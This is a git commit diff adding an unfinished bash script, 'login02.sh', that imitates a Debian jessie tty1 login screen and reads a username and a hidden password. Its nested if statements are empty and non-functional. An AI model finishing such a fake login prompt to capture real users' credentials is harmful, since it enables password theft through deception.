4fcb9c2d308c39b805ed99aa7d44d379d0faf6ec
thalesfaggiano <thalesfaggiano@gmail.com>
2017-09-14 16:42:58 -0300

    Update login02.sh

--- login02.sh
+++ login02.sh
@@ -1,1 +1,15 @@
 #!/bin/bash
+clear
+echo
+echo "Debian GNU/Linux jessie 8 tty1"
+echo
+echo -n "jessie login: "
+read LOGIN
+echo -n "Password: "
+read -s PASSW
+echo
+if [] ; then
+  if [] ; then
+  
+  fi
+fi
